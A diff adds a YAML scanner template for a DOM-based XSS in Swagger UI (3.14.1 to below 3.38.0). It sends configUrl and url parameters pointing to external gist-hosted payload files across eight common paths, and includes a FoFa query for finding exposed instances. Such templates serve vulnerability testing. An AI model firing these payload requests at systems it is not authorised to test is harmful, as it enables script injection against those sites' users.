@@ -1,0 +1,60 @@
+id: Swagger-UI-XSS
+
+info:
+  name: 3.14.1<=Swagger-UI-XSS< 3.38.0
+  author: li1u(https://huclilu.github.io/)
+  severity: medium
+  description: 
+     swagger-ui使用了一个过时的库DomPurify，结合库的特性允许获得由查询参数控制的DOM型XSS,该漏洞允许攻击者在页面上注入任何属性的HTML元素
+     此漏洞 3.38.0 已经修复，建议受影响用户及时升级更新 Swagger UI 到最新版本。漏洞利用点为index.html?configUrl=xxx.json或index.html?url=xxx.yaml
+     FoFa：icon_hash="-1180440057"
+rules:
+   r0:
+      request:
+        method: GET
+        path: /swagger-ui.html?configUrl=https://gist.githubusercontent.com/huclilu/55994f2b4987590df1f9947538fd8c21/raw/5b897657e84970418a64d9b84288ca86d9c9b942/li1u.json
+      expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css") || response.body.bcontains(b"swagger-ui.css") || response.body.bcontains(b"swagger-ui-")
+      stop_if_match: true
+   r1:
+      request:
+        method: GET
+        path: /swagger-ui.html?url=https://gist.githubusercontent.com/huclilu/e59bc294ab76cb7eda1983822c226751/raw/9b63cab9183231a5fb45704b8fb5ed505fee1637/li1u.yaml
+      expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css") || response.body.bcontains(b"swagger-ui.css") || response.body.bcontains(b"swagger-ui-")
+      stop_if_match: true
+   r2:
+      request:
+        method: GET
+        path: /index.html?configUrl=https://gist.githubusercontent.com/huclilu/55994f2b4987590df1f9947538fd8c21/raw/5b897657e84970418a64d9b84288ca86d9c9b942/li1u.json
+      expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css") || response.body.bcontains(b"swagger-ui.css") || response.body.bcontains(b"swagger-ui-")
+      stop_if_match: true
+   r3:
+      request:
+        method: GET
+        path: /index.html?url=https://gist.githubusercontent.com/huclilu/e59bc294ab76cb7eda1983822c226751/raw/9b63cab9183231a5fb45704b8fb5ed505fee1637/li1u.yaml
+      expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css") || response.body.bcontains(b"swagger-ui.css") || response.body.bcontains(b"swagger-ui-")
+      stop_if_match: true
+   r4:
+      request:
+        method: GET
+        path: /swagger/index.html?url=https://gist.githubusercontent.com/huclilu/e59bc294ab76cb7eda1983822c226751/raw/9b63cab9183231a5fb45704b8fb5ed505fee1637/li1u.yaml
+      expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css") || response.body.bcontains(b"swagger-ui.css") || response.body.bcontains(b"swagger-ui-")
+      stop_if_match: true
+   r5:
+      request:
+        method: GET
+        path: /swagger/index.html?configUrl=https://gist.githubusercontent.com/huclilu/55994f2b4987590df1f9947538fd8c21/raw/5b897657e84970418a64d9b84288ca86d9c9b942/li1u.json
+      expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css") || response.body.bcontains(b"swagger-ui.css") || response.body.bcontains(b"swagger-ui-")
+      stop_if_match: true
+   r6:
+      request:
+        method: GET
+        path: /swagger-ui/index.html?url=https://gist.githubusercontent.com/huclilu/e59bc294ab76cb7eda1983822c226751/raw/9b63cab9183231a5fb45704b8fb5ed505fee1637/li1u.yaml
+      expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css") || response.body.bcontains(b"swagger-ui.css") || response.body.bcontains(b"swagger-ui-")
+      stop_if_match: true
+   r7:
+      request:
+        method: GET
+        path: /swagger-ui/index.html?configUrl=https://gist.githubusercontent.com/huclilu/55994f2b4987590df1f9947538fd8c21/raw/5b897657e84970418a64d9b84288ca86d9c9b942/li1u.json
+      expression: response.status == 200 && response.body.bcontains(b"swagger-ui/css") || response.body.bcontains(b"swagger-ui.css") || response.body.bcontains(b"swagger-ui-")
+      stop_if_match: true
+expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7()
